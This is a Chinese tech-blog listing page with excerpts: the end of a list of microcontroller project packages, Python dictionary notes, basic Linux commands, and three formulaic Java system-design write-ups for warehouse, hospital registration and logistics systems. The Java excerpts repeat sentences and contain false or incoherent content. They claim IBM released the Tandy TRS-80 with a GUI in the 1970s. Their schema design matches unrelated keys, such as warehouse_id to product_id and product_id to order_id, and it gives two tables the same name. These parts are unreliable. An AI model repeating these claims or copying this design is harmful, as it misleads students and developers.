30、基于单片机的32x8 LED点阵屏电子钟系统（汉字生成器软件+字模提取软件+原代码+电路图）
31、基于单片机的水箱单片机控制系统（设计报告+电路原理图+程序）
32、基于单片机的新型消防车系统（设计报告+开题中期报告+电路原理图+程序）
33、基于单片机的智能台灯设计系统（设计报告+电路原理图+程序）
34、基于单片机的脉冲反射式超声波测距系统设计与实现（设计报告+源代码+仿真+PCB+开题报告+中期报告）
35、基于单片机的无线数据收发系统（设计报告+开题中期报告+电路原理图+程序）
36、基于单片机的用单片机控制直流电机系统（设计报告+电路原理图+程序）
37、基于单片机的微型打印机控制电路系统（设计报告+开题中期报告+程序）
38、基于单片机的电压检测系统（VB上位机+proteus仿真文件+程序）
39、基于单片机的AVR及无线收发模块的脉搏监测系统（设计报告+开题中期报告+中英文翻译）
40、基于单片机的温度监控系统（设计报告+程序）
41、基于单片机的一种智能频率计的设计与制作（AVR）系统（proteus仿真文件+程序）
42、基于单片机的无线温湿度测控系统设计与实现（设计报告+源代码+PCB仿真+开题中期报告）
43、基于单片机的智能小区安防系统（设计报告+开题中期报告+程序）
44、基于单片机的水库水位报警系统设计与实现（设计报告+源代码+proteus仿真+PCB+实物图+元件清单）
45、基于单片机的应用电子、继电线路系统（设计报告+电路原理图+程序）
46、基于单片机的模拟电梯控制设计与实现（设计报告+代码+仿真+开题报告+中期报告）
47、基于单片机的烟叶醇化车间温湿度监测系统设计与实现（设计报告+源代码+protel仿真+PCB+开题报告+中期报告）
48、基于单片机的位置传感器运动控制系统设计与实现（设计报告+源代码+原理图+PCB+开题报告+中期报告）
49、基于单片机的速度里程实时显示系统设计与实现（设计报告+源代码+proteus仿真+PCB实物+开题报告+中期报告）
50、基于单片机的温度监控系统（设计报告+电路原理图+程序）
51、基于单片机的照明灯智能控制器系统（设计报告+电路原理图+程序）
52、基于单片机的液体点滴速度监控装置系统（设计报告+电路原理图+程序）
53、基于单片机的智能健康监护仪系统（设计报告+开题中期报告）
54、基于单片机的无线遥控盆腔治疗仪系统（设计报告+电路原理图+程序）
55、基于单片机的正弦信号发生器系统（设计报告+电路原理图）
56、基于单片机的三维雕刻机刀头控制系统设计与实现（设计报告+源代码+proteus仿真+PCB+开题报告+中期报告）
57、基于单片机的同步电机模型的MATLAB仿真系统（设计报告）
58、基于单片机的音频信号分析仪系统（设计报告+电路原理图+程序）
59、基于单片机的无线语音遥控智能车系统（设计报告）
60、基于单片机的贪吃蛇游戏系统设计与实现（设计报告+源代码+protel仿真+PCB+开题报告+中期报告）
61、基于单片机的温度控制系统（设计报告+程序+仿真文件）
62、基于单片机的红外遥控电路系统（设计报告+开题中期报告+中英文报告+程序）
63、基于单片机的远程温度控制系统（设计报告+开题中期报告+中英文翻译）
64、基于单片机的遥控系统（设计报告+开题中期报告）
65、基于单片机的数控云台系统（proteus仿真+程序资料）
66、基于单片机的西门子PLC的步进电机直接控制系统（设计报告+开题中期报告）
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9485d3ef1e2d8c00c65c32b07bd1ef35/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3b6c7c3b90c9405306a8d313cc68985f/" rel="bookmark">
			Python学习笔记（5）字典（dict）常用方法及基础操作、字典视图
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		字典（dict）常用方法及基础操作 一、前言二、字符基本操作1.创建字典2.关系判断3.索引 三、字典常用方法1.clear()2.copy()3.get(key[default])4.pop(key[default])5.popitem()6.setdefault(key[default])7.update(other) 四、字典视图1.items()2.keys()3.values()4.键视图的集合操作 一、前言 字典是包含若干“键：值”的无序可改变序列，表示一种映射关系，也称作关联数组，有些类似于c/c++中的结构体数组，具体特点如下：
（1）字典的键通常采用字符串，但也可以用数字、元组等不变的类型。 （2）值可以是任意类型。
（3）它通过键来索引映射的值，而不是通过位置来索引。
二、字符基本操作 1.创建字典 可以用多种方法创建字典，例如：
{} 或者 dict() # 创建一个空字典 a = {1:'song',2:"niu",3:"b"} # 数字当做键 b = {"as":"sa","s":"asd"} # 字符串作为键 c = {(1,2,3):5,(1,5):99} # 元组作为键 d = {1:{'a':1,'d':"adf"},2:"sd"} # 嵌套字典 e = dict(name='as',sex='man') # 赋值法创建字典 f = dict([('a',2),('d',3)]) # 用包含键元组和值元组的列表 g = dict.fromkeys(['a',1]) # 创建无映射值的字典，默认值为None # 结果：{‘a':None,1:None} h = dict.fromkeys('ABC',20)# 使用字符串和映射值的字典 # 结果：{'A':20,‘B':20,'C':20} 2.关系判断 关系判断可以判断字典中是否含有这个键，例如：
dic = {'a': 1, 'b': 2} print('a' in dic) # Ture print(1 in dic) # Flase 3.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3b6c7c3b90c9405306a8d313cc68985f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c0cafdf137fdb114d92fe08469f369e5/" rel="bookmark">
			Linux详解——常用命令(二)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
一、常用命令
1.进程相关命令
2.vi命令
3.软件相关命令
RPM命令
YUM命令
4.用户和组相关命令
5.权限相关命令
一、常用命令 1.进程相关命令 # 1.ps 询在当前控制台上运行的进程
ps -aux 说明:查询系统中所有运行的进程，包括后台进程，其中参数a是所有进程，参数x包括不占用控制台的进程，参数u显示用户。
ps -ef 说明:查询系统中所有运行的进程，包括后台进程，而且可以显示出每个进程的父进程号。
# 2.top 命令 动态显示系统进程
# 3.kill 杀死进程
kill 3029 说明：上述命令中3029是进程号；一般在执行kill命令之前，先用ps或pstree来查询一下将要被杀掉的进程的进程号。 kill -9 3029 说明:强制终止3029号进程的运行，其中参数-9代表强制的意思,实际上kill命令是向该进程发送信号，
该进程接到信号后决定是否停止运行，有些守护进程必须要收到参数9才终止运行。
2.vi命令 vi / vim是Unix / Linux上最常用的文本编辑器而且功能非常强大。
常用命令:
i 在光标前插入
I 在光标当前行开始插入
a 在光标后插入
A 在光标当前行末尾插入
o 在光标当前行的下一行插入新行
O 在光标当前行的上一行插入新行
----------------重点---------------------------
:set nu 显示行号
:set nonu 取消行号
gg 到文本的第一行
G 到文本的最后一行
:n 到文本的第n行
------------------重点-------------------------
u undo,取消上一步操作
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c0cafdf137fdb114d92fe08469f369e5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6e0e7215a0a6dc018e69727873931f85/" rel="bookmark">
			基于java的web仓库管理系统设计与实现
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		基于java的web仓库管理系统设计与实现
I. 引言 A.研究背景和动机 基于Java的Web仓库管理系统是近年来快速发展的领域之一。它提供了丰富的功能，如数据存储、数据检索、数据分析和数据可视化等。本文将重点介绍基于Java的Web仓库管理系统设计与实现的研究背景和动机，并介绍相关的技术细节和架构设计。
首先，Web仓库管理系统是一种用于管理企业或组织数据的软件系统。它可以用于存储和检索各种类型的数据，如文本、图像、音频和视频等。Web仓库管理系统可以提供各种功能，如数据存储、数据检索、数据分析和数据可视化等。它可以帮助用户轻松地管理数据，提高数据处理的效率，并提供更好的数据可视化体验。
其次，基于Java的Web仓库管理系统可以实现高效的数据存储和检索。Java是一种流行的编程语言，它可以提供许多强大的功能和工具，如对象导向编程、多线程编程、网络编程等。这些功能和工具可以帮助开发人员轻松地实现高效的数据存储和检索。此外，Java还提供了丰富的API和库，可以帮助开发人员快速地开发各种类型的Web应用程序。
最后，基于Java的Web仓库管理系统可以实现数据分析和数据可视化。数据分析和数据可视化是Web仓库管理系统的重要功能之一。它可以帮助用户分析和可视化各种类型的数据，并提供更好的数据决策支持。Java提供了许多强大的数据分析和数据可视化工具，如JFreeChart、Apache Hadoop、Spring Data等。这些工具可以帮助用户快速地实现数据分析和数据可视化。
综上所述，基于Java的Web仓库管理系统设计与实现的研究背景和动机非常广泛。它可以帮助用户轻松地管理数据，提高数据处理的效率，并提供更好的数据可视化体验。基于Java的Web仓库管理系统还可以实现高效的数据存储和检索，以及数据分析和数据可视化。随着技术的不断发展和应用场景的不断扩大，基于Java的Web仓库管理系统将继续成为企业和组织数据管理的首选工具。
B.目标和意义 基于Java的Web仓库管理系统设计与实现的目标是提供一个高效、智能的仓库管理系统，该系统旨在满足企业内部仓库管理的需求，并实现信息的共享和协同。该系统能够实现以下目标：
实现仓库信息的自动化录入和管理，包括入库、出库、盘点等操作，同时提供对数据的实时查询和统计功能，帮助企业进行全面的仓库管理。提供全面的仓库信息共享和协同功能，帮助企业内部不同部门之间进行信息的共享和协同，并实现对信息的实时监控和管理。提供对仓库信息的实时监控和管理功能，包括库存数量、进出库记录、资产管理等，帮助企业及时发现和管理库存问题。提供对仓库信息的全面分析和预测功能，包括库存变化趋势分析、资产使用率分析等，帮助企业进行全面的分析和预测。提供对仓库信息的全面报告和统计功能，包括仓库绩效评估、资产管理报告等，帮助企业进行全面的报告和统计。
基于Java的Web仓库管理系统设计与实现的意义在于，该系统能够帮助企业进行全面的仓库管理，提高仓库管理的效率和准确性，降低管理成本，并实现仓库信息的共享和协同，为企业的发展提供全面的保障和支持。同时，该系统还能够为企业提供全面的分析和预测，帮助企业进行全面的决策和规划，为企业的发展提供全面的保障和支持。 II. 相关技术和工具 A.Java语言 Java语言是一种面向对象的高级编程语言，由Sun Microsystems（现在是Oracle公司）于1995年发布。Java被设计成可移植、可靠、安全和简单易学的语言，以及具有优秀的性能和高效的垃圾回收机制。
Java语言拥有众多特点和优势，下面是一些主要特点的介绍：
简单易学：Java语言借鉴了C++语法，但摒弃了C++中的复杂和容易出错的部分。它具有清晰、简洁的语法，易于学习和理解。跨平台性：Java程序是一次编写，到处运行。Java程序在编译后生成的字节码可以在任何支持Java虚拟机（JVM）的平台上运行，而不需要重新编译。面向对象：Java语言是一种真正的面向对象编程语言，具有封装、继承和多态等面向对象的概念和特征。这使得Java具有更好的结构化、可读性和可维护性。内存管理：Java具有自动垃圾回收机制，程序员无需手动管理内存。通过垃圾回收器，Java可以自动识别并回收不再使用的内存资源，避免了内存泄漏和野指针等问题。多线程支持：Java提供了强大的多线程支持，使得程序能够同时执行多个任务。多线程可以提高程序的性能和响应能力。丰富的类库和API：Java拥有众多的类库和应用程序接口（API），包括各种功能和领域所需的类和方法。这些类库和API极大地简化了程序开发工作，提高了开发效率。安全性：Java对安全性有着很高的重视，在设计上考虑了各种安全因素，如通过字节码验证、安全管理器等机制来防止恶意代码的执行。分布式计算：Java提供了强大的网络编程功能，使其成为构建分布式计算应用和网络服务的理想语言。
总之，Java语言是一种强大而灵活的编程语言，在各种应用领域都有广泛的应用。它不仅适用于企业级应用，也适用于开发移动应用、游戏、桌面应用程序等各种应用。Java的跨平台性和可移植性使其成为开发人员的首选语言之一。 B.数据库技术 数据库技术是一种用于存储、管理和操作数据的技术。它是一种通过数据表来组织和管理数据的方式，可以用于各种应用程序和系统。数据库技术可以提供高效的数据管理和数据存储，可以用于各种应用程序和系统，如ERP系统、CRM系统和供应链管理系统等。数据库技术可以提供高效的数据管理和数据存储，可以用于各种应用程序和系统，如ERP系统、CRM系统和供应链管理系统等。
C.GUI技术 GUI技术是用户界面技术的一种，它的主要作用是提供图形化的用户界面，让用户能够更加直观、便捷地与计算机进行交互。
首先，GUI技术通过图形化的界面，可以让用户更加直观地了解计算机的各个功能，如文件管理、系统设置、应用软件等。在Windows操作系统中，可以通过右键点击空白处，选择“个性化”，然后在“主题”、“桌面壁纸”等选项中选择自己喜欢的图片，来美化自己的桌面。
其次，GUI技术可以提高用户的使用效率。例如，在软件中使用鼠标进行操作，可以避免使用键盘输入的繁琐。此外，在Windows系统中，可以通过使用“开始菜单”来快速打开应用程序、浏览网页等，而无需输入具体的网址或文件名。
最后，GUI技术可以提高计算机的安全性。例如，在Windows系统中，可以通过设置密码或指纹识别等方式，来保护自己的账户安全。
总之，GUI技术是计算机界中不可或缺的一部分，它可以让用户更加直观、便捷地与计算机进行交互，提高用户的使用效率和计算机的安全性。
III. 系统需求分析与设计 A.系统功能需求 基于Java的Web仓库管理系统是一个高效的仓库管理系统，可以管理库存，订单和付款等信息。它是一个基于Java技术的企业级应用程序，可实现用户管理、库存管理、订单管理、付款管理等功能。该系统包括前端和后端两个部分。前端部分是用户界面，它允许用户浏览库存、创建订单、付款等。后端部分是业务逻辑，它处理所有与数据库相关的操作，例如库存管理和订单管理。后端由多个模块组成，包括订单模块、库存模块、付款模块等。
B.业务流程分析 Web仓库管理系统是一种基于Web的仓库管理系统，它使用Java技术开发，通过Web服务器与客户端之间的通信来实现仓库的管理功能。Web仓库管理系统主要包括以下几个模块：
1.用户管理模块：管理员可以添加、修改、删除用户信息，并管理用户的权限和角色。
2.商品管理模块：管理员可以添加、修改、删除商品信息，并管理商品的类别、价格、描述等。
3.订单管理模块：管理员可以添加、修改、删除订单信息，并管理订单的状态、金额、付款方式等。
4.库存管理模块：管理员可以添加、修改、删除库存信息，并管理库存的状态、数量、价格等。
5.报表管理模块：管理员可以生成、查看和导出报表，如销售报表、库存报表等。
Web仓库管理系统通过提供良好的用户界面和功能，使得仓库管理员可以更加方便地管理仓库的各类业务。同时，系统还提供了安全可靠的数据库保护机制，确保仓库管理数据的安全性和保密性。
C.数据库设计 首先，我们需要一个主库来存储仓库的基本信息，包括仓库的名称、描述、地址等。我们可以将主库命名为“ warehouse ”，其中包含以下字段：
name（仓库名称）description（仓库描述）address（仓库地址）
其次，我们需要一个商品库来存储商品的信息，包括商品的名称、描述、价格、库存等。我们可以将商品库命名为“ product ”，其中包含以下字段：name（商品名称）description（商品描述）price（商品价格）stock（商品库存）
最后，我们需要一个订单库来存储订单的信息，包括订单的编号、商品编号、数量、价格、状态等。我们可以将订单库命名为“ order ”，其中包含以下字段：order_id（订单编号）product_id（商品编号）quantity（商品数量）price（商品价格）status（订单状态）
接下来，我们需要创建主库、商品库和订单库的关系。具体来说，主库中的 warehouse_id 字段应该与商品库中的 product_id 字段相匹配，而商品库中的 product_id 字段应该与订单库中的 order_id 字段相匹配。这样，我们就可以方便地将仓库、商品和订单信息联系起来。
最后，我们需要创建一个用户库来存储用户的信息，包括用户的编号、姓名、密码、邮箱等。我们可以将用户库命名为“ user ”，其中包含以下字段：user_id（用户编号）name（用户姓名）password（用户密码）email（用户邮箱）
我们还需要创建一个角色库来存储用户的角色信息，包括用户所处的角色、权限等。我们可以将角色库命名为“ role ”，其中包含以下字段：role_id（角色编号）name（角色名称）description（角色描述）user_id（角色所属用户编号）
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6e0e7215a0a6dc018e69727873931f85/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6c8f48c7276a16844e9108c8b80c0dc1/" rel="bookmark">
			基于java的ssh医院在线挂号系统设计与实现
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		基于java的ssh医院在线挂号系统设计与实现
I. 引言 A.研究背景和动机 基于Java的SSH医院在线挂号系统设计与实现的研究背景和动机
随着信息技术的迅速发展和应用，医院在线挂号系统已成为医院管理的重要组成部分。传统的挂号方式存在许多问题，如排队时间长、挂号费用高、信息不透明等。因此，如何提高医院挂号系统的效率和用户体验，已成为摆在医院管理者面前的难题。
基于Java的SSH医院在线挂号系统设计与实现的研究动机，主要体现在以下几个方面：
1.提高挂号效率和用户体验
传统的挂号方式存在许多问题，如排队时间长、挂号费用高、信息不透明等。而基于SSH医院在线挂号系统的设计与实现，可以提高挂号效率和用户体验，为患者提供更好的就医体验。
2.提高医院管理效率
基于SSH医院在线挂号系统的设计与实现，可以实现医院管理的自动化，减少人工操作，提高医院管理效率。
3.提高医院资源利用率
基于SSH医院在线挂号系统的设计与实现，可以实现医院资源的合理配置，提高医院资源利用率，减少医院资源浪费。
基于SSH医院在线挂号系统的设计与实现，主要包括以下几个方面：
1.挂号流程优化
基于SSH医院在线挂号系统的设计与实现，可以优化挂号流程，减少排队时间，提高挂号效率。
2.挂号费用优化
基于SSH医院在线挂号系统的设计与实现，可以实现挂号费用的智能计算，避免患者因费用问题而放弃挂号。
3.信息公开透明
基于SSH医院在线挂号系统的设计与实现，可以实现挂号信息的公开透明，让患者了解医院挂号系统的运作方式，增强患者对医院的信任感。
基于SSH医院在线挂号系统的设计与实现，可以提高医院挂号系统的效率和用户体验，为患者提供更好的就医体验，同时也能够提高医院管理效率，提高医院资源利用率，实现医院管理的自动化，为医院管理者提供更好的管理决策支持。
B.目标和意义 基于Java的SSH医院在线挂号系统设计与实现的目标是提供一个安全、高效、方便的医院挂号平台，为患者提供在线挂号、查询、预约、支付等服务。该系统旨在为患者提供更加便捷、快捷的医疗服务，并帮助医院优化资源配置，提高工作效率。
该系统主要包括以下功能：
患者挂号：患者可以通过该系统进行在线挂号，选择医生、科室、时间等信息，系统会为患者自动生成预约号。患者查询：患者可以通过该系统查询医生的详细信息、患者就诊记录等信息。患者预约：患者可以通过该系统进行在线预约，选择医生、时间等信息，系统会为患者自动生成预约号。患者支付：患者可以通过该系统进行在线支付，选择医生、科室、时间等信息，系统会为患者自动生成支付信息。医院管理：医院可以通过该系统进行患者管理、医生管理、科室管理等管理操作。
该系统具有以下优势：安全性：该系统采用了多层加密技术，保证患者信息和医院信息的安全性。稳定性：该系统采用了分布式架构，保证系统的稳定性。可扩展性：该系统可以进行扩展，支持更多的患者、医生、科室等信息的添加。
该系统具有以下意义：方便性：该系统为患者提供了在线挂号、查询、预约、支付等服务，大大方便了患者。效率性：该系统为医院提供了在线挂号、查询、预约、支付等服务，大大提高了医院的工作效率。优化资源配置：该系统可以优化医院的资源配置，提高医院的工作效率，从而提高医院的服务质量。
该系统具有以下挑战：技术挑战：该系统需要采用多层加密技术、分布式架构、多线程技术等技术，保证系统的安全性、稳定性、可扩展性。资源挑战：该系统需要处理大量的患者信息和医院信息，需要占用大量的服务器资源，需要进行优化。用户体验挑战：该系统需要为患者提供良好的用户体验，需要对系统的界面、交互、性能等方面进行优化。
该系统具有以下解决方案：技术解决方案：采用多层加密技术、分布式架构、多线程技术等技术，保证系统的安全性、稳定性、可扩展性。资源优化：采用云计算技术，将医院的信息和患者信息存储在云端，可以大大提高医院的工作效率。用户体验优化：对系统的界面、交互、性能等方面进行优化，提高用户的满意度。
该系统具有以下应用场景：医院管理：该系统可以用于医院管理，医院可以通过该系统进行患者管理、医生管理、科室管理等管理操作。医院营销：该系统可以用于医院营销，医院可以通过该系统进行患者营销、医生营销、科室营销等营销操作。医疗健康：该系统可以用于医疗健康，患者可以通过该系统进行在线挂号、查询、预约、支付等服务，帮助患者更好地管理自己的健康。
该系统具有以下未来发展方向：多语言支持：该系统可以支持多种语言，方便国际患者使用。医生管理：该系统可以支持医生管理，医院可以通过该系统进行医生管理、医生营销等操作。个性化服务：该系统可以支持个性化服务，医院可以根据患者的需求和偏好为其提供定制化的服务。
该系统具有以下未来发展趋势：智能化：该系统可以向智能化方向发展，通过机器学习、自然语言处理等技术，为患者提供更加智能化的服务。移动化：该系统可以向移动化方向发展，支持移动端挂号、查询、预约、支付等服务，方便患者随时随地进行医疗服务。个性化服务：该系统可以向个性化服务方向发展，通过数据分析和用户行为分析，为患者提供更加个性化的服务。 II. 相关技术和工具 A.Java语言 Java是一种面向对象的编程语言，由Sun Microsystems（现在是Oracle公司）于1995年发布。Java的设计目标是创建一种跨平台的、可移植的、安全的、可靠的、高效的语言。Java的语法清晰简洁，易于学习和理解。Java具有跨平台的特性，能够在不同的操作系统上运行。Java还支持多线程编程，能够同时处理多个任务。Java还具有良好的内存管理，能够自动识别并回收不再使用的内存资源，避免了内存泄漏和野指针等问题。Java还支持分布式计算，能够实现分布式网络应用。Java在Web开发、移动应用开发和企业应用开发领域具有广泛的应用，特别是在大型企业应用开发中，Java能够提供高效、稳定、可扩展的解决方案。Java还具有丰富的类库和应用程序接口（API），能够简化程序开发工作，提高开发效率。总之，Java是一种功能强大、高效、可移植的编程语言，是企业级应用开发的首选语言之一。
B.数据库技术 数据库技术是计算机科学领域中的一项重要技术，它可以帮助人们管理、存储和处理海量的数据。数据库技术在计算机软件和硬件的发展中扮演着重要的角色，是许多应用程序的组成部分。
数据库技术可以分为两种类型：关系型数据库和非关系型数据库。关系型数据库使用表格结构来存储数据，并使用SQL（结构化查询语言）进行管理和操作。非关系型数据库则使用不同的数据存储方式，例如键值对、文档、列族和图形等。
关系型数据库通常被用于需要高度可靠性和数据一致性的应用程序，例如企业级应用和大型数据中心。它们具有良好的数据存储和管理能力，可以支持大量的数据，并提供多种数据查询和分析工具。
非关系型数据库则通常被用于需要高度可扩展性和灵活性的应用程序，例如Web应用程序和移动应用程序。它们具有良好的数据存储和管理能力，可以支持大量的数据，并提供多种数据查询和分析工具。
数据库技术的发展使得数据存储和管理变得更加高效和简单。它们为企业和开发者提供了强大的数据分析和处理能力，可以支持各种应用程序的开发。随着技术的发展，数据库技术将继续发挥重要的作用，为未来的应用提供更多的支持。
C.GUI技术 GUI技术是图形用户界面技术的简称，它是一种通过图形元素（如按钮、菜单、标签、图标等）来展现用户界面，并使用户能够通过交互操作来完成各种任务的计算机技术。
GUI技术最早可以追溯到20世纪70年代，当时IBM公司推出了一种名为Tandy TRS-80的计算机，它使用了一种名为Tandy Desktop的图形用户界面，可以显示各种图形元素，并使用户能够通过鼠标进行各种操作。这种图形用户界面成为了后来计算机界面的先驱。
随着计算机技术的不断发展，GUI技术也得到了不断改进和完善。目前，常见的GUI技术包括Windows、Mac OS、Linux、Unix等。这些操作系统都提供了各种图形界面，让用户能够更加方便地进行各种操作。
GUI技术也广泛应用于各种应用程序中，如文字处理、电子邮件、浏览器、游戏等。通过GUI技术，用户可以更加直观地进行各种操作，并享受到更加优秀的用户体验。
总之，GUI技术是一种非常优秀的计算机技术，它为用户提供了更加方便、直观、友好的界面，让用户能够更加高效地完成各种任务。
III. 系统需求分析与设计 A.系统功能需求 基于Java的SSH医院在线挂号系统设计与实现的系统功能需求：
用户登录功能：用户可以通过输入用户名和密码登录系统，也可以使用第三方认证（如手机号码或身份证号）进行登录。挂号功能：用户可以通过在线挂号系统挂号，包括选择科室、选择医生、选择时间等。挂号成功后，系统会生成挂号号单并发送给医生。预约功能：用户可以通过在线预约系统预约医生的时间，预约成功后，系统会生成预约信息并发送给医生。医患交流功能：用户可以在系统中与其他患者交流，包括讨论病情、分享经验等。挂号提醒功能：系统会通过手机短信或电子邮件等方式提醒用户挂号的时间和地点。订单管理功能：系统会记录患者的就诊信息，包括医生、时间、药品等，并生成订单号。查询功能：用户可以通过查询系统查询自己的挂号记录、就诊记录等信息。退号功能：用户可以通过在线退号系统退号，包括取消挂号、取消预约等。数据备份功能：系统会定期备份数据，以保证数据的安全性和完整性。信息安全：系统会采取各种措施保证数据的安全性，包括加密传输、访问控制等。 B.业务流程分析 基于Java的SSH医院在线挂号系统设计与实现的业务流程分析，主要分为以下几个步骤：
登录：患者通过用户名和密码登录系统，进入挂号页面。选择科室：患者根据自己的病情选择对应的科室，进入对应科室页面。选择医生：患者选择医生后，进入医生个人页面，查看医生的详细信息。填写就诊信息：患者填写自己的就诊信息，包括症状、就诊时间等。支付挂号费：患者通过支付挂号费，挂号成功。预约就诊：患者可以选择预约时间，在预约时间内预约就诊。预约结果查询：患者可以在预约时间到达医院后，查询自己的预约结果。支付费用：患者在医院就诊时，需要支付相应的费用。挂号成功：患者挂号成功，可以开始就诊。 C.数据库设计 基于Java的SSH医院在线挂号系统设计与实现的数据库设计，采用了MySQL数据库，用于存储用户信息、药品信息、就诊信息等。MySQL是一种开源的关系型数据库，具有高效、稳定、易用等特点。下面是数据库设计的具体细节：
用户信息表（UserInfo），用于存储用户的基本信息，如用户名、密码、邮箱等。该表需要设置主键，确保用户的唯一性。药品信息表（MedicineInfo），用于存储药品的基本信息，如药品名称、价格、说明等。该表需要设置主键，确保药品的唯一性。就诊信息表（AppointInfo），用于存储就诊的基本信息，如就诊时间、医生、患者等。该表需要设置主键，确保就诊的唯一性。预约信息表（AppointInfo），用于存储预约的基本信息，如预约时间、医生、患者等。该表需要设置主键，确保预约的唯一性。
以上是MySQL数据库的数据库设计，MySQL支持事务处理、数据备份等功能，可以保证数据的安全性和可靠性。 D.用户界面设计 SSH医院在线挂号系统是一个基于Java的在线挂号系统，该系统集成了医院的信息系统，实现了挂号、预约、查询、缴费等功能。该系统设计与实现的目标是提供高效、准确、方便的医疗服务，提高医院的运营效率和服务质量。
系统设计分为以下几个方面：
系统架构
SSH医院在线挂号系统采用了三层架构设计，即服务层、业务层和数据层。服务层主要负责提供服务接口，业务层主要负责业务逻辑，数据层主要负责数据存储和管理。用户管理
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6c8f48c7276a16844e9108c8b80c0dc1/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/dacb8725f68ed8f99a1bce7b0d3b44ab/" rel="bookmark">
			基于java的SSH框架物流配送管理系统设计与实现
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		基于java的SSH框架物流配送管理系统设计与实现
I. 引言 A.研究背景和动机 设计目标：设计一个基于Java的SSH框架物流配送管理系统，实现物流配送管理业务的自动化、智能化，提高物流配送管理效率和质量。需求分析：分析物流配送管理业务的需求，包括物流配送管理流程、物流配送信息管理、物流配送成本管理、物流配送质量管理等方面。功能设计：设计物流配送管理系统的功能模块，包括物流配送信息管理、物流配送成本管理、物流配送质量管理、物流配送管理决策支持、物流配送管理控制系统等方面。数据库设计：设计物流配送管理系统的数据库结构，包括物流配送信息表、物流配送成本表、物流配送质量表、物流配送管理决策支持表、物流配送管理控制系统表等方面。安全性设计：设计物流配送管理系统的安全性措施，包括数据加密、权限控制、安全审计等方面。开发工具：选择合适的开发工具，包括Eclipse、NetBeans、IntelliJ IDEA等。开发环境：选择合适的开发环境，包括JDK、Spring Framework、Hibernate等。测试环境：选择合适的测试环境，包括JUnit、Selenium、Robot Framework等。部署环境：选择合适的部署环境，包括Linux、Windows、Mac等。运维管理：选择合适的运维管理工具，包括Ansible、Salt Stack等。 B.目标和意义 基于Java的SSH框架物流配送管理系统设计与实现的目标是实现一个高效、智能的物流配送管理系统，以提高物流配送的管理效率，提高客户的满意度，降低企业的运营成本。该系统将涵盖多个方面，如订单管理、仓库管理、物流管理、采购管理等。通过该系统，企业可以更加便捷地管理订单、库存、配送、采购等环节，提高企业的运营效率和竞争力。
II. 相关技术和工具 A.Java语言 Java是一种高级编程语言，由Sun Microsystems（现在是Oracle公司）于1995年发布。它是一种面向对象的语言，支持跨平台运行，具有优秀的性能和高效的垃圾回收机制。
Java语言具有简单易学、跨平台性、面向对象等特点。它借鉴了C++语法，但摒弃了C++中的复杂和容易出错的部分。它具有清晰、简洁的语法，易于学习和理解。它可以在各种平台和各种操作系统上运行，并且不需要重新编译。
Java语言支持面向对象编程，具有封装、继承和多态等面向对象的概念和特征。这使得Java具有更好的结构化、可读性和可维护性。它可以在开发过程中帮助程序员更好地组织和管理代码。
Java语言也提供了强大的多线程支持，使得程序可以同时执行多个任务。多线程可以提高程序的性能和响应能力。它还可以帮助程序员更好地组织和管理代码，并提高代码的可读性。
Java语言还提供了丰富的类库和应用程序接口（API），这些类库和API可以简化程序开发工作，提高开发效率。Java语言可以应用于各种领域，如Web开发、移动应用开发、企业应用开发等。
总之，Java是一种优秀的编程语言，它具有简单易学、跨平台性、面向对象等特点。它是一个广泛使用的语言，在各种领域都有应用。如果你正在寻找一种优秀的编程语言，Java是一个很好的选择。
B.数据库技术 数据库技术是一种用于存储、管理和操作数据的技术。它可以帮助企业和组织管理海量的数据，并实现数据的共享和访问。数据库技术通常由以下几个组成部分组成：
数据模型：数据库技术的基础是数据模型，它定义了数据的实体、属性、关系等。数据模型通常由数据实体、数据属性、数据关系等组成。数据实体是指数据库中的对象，数据属性是指每个数据实体的属性，数据关系是指不同数据实体之间的关联关系。数据库管理系统：数据库管理系统是数据库技术的核心部分，它提供了数据的存储、管理、查询等功能。数据库管理系统通常由数据库管理软件、数据存储介质、数据库物理结构、数据库软件应用接口等组成。数据库应用程序：数据库应用程序是数据库技术的重要组成部分，它提供了数据的查询、管理、维护等功能。数据库应用程序通常由数据访问语言、数据管理工具、数据管理软件等组成。数据库安全：数据库安全是指保护数据库中的数据不被非法访问、篡改、破坏等。数据库安全通常包括数据加密、访问控制、备份恢复、审计追踪等措施。数据库性能优化：数据库性能优化是指通过调整数据库的结构、算法、配置等手段提高数据库的性能。数据库性能优化通常包括数据压缩、索引优化、数据缓存、数据库迁移等手段。
数据库技术在企业和组织中具有广泛的应用，包括数据管理、数据分析、数据查询、数据存储等。通过采用适当的数据库技术，企业和组织可以更好地管理数据，提高数据的质量和可靠性，实现数据的安全和保密。 C.GUI技术 GUI技术，即图形用户界面技术，是一种基于图形化操作界面和用户交互方式的技术。在计算机应用领域中，GUI技术已经成为了一种普遍使用的技术。通过GUI技术，用户可以更加直观地进行操作，提高操作效率，并且可以避免使用复杂的命令行界面。
GUI技术包括多种图形化界面，例如Windows界面、MacOS界面、Linux界面等。不同的操作系统提供了不同的界面，但是它们的基本结构都是相似的。在GUI界面中，用户可以通过鼠标、键盘等输入设备来控制界面元素，例如按钮、文本框、菜单等。这些元素可以进行各种操作，例如打开文件、创建新项目、修改文件等。
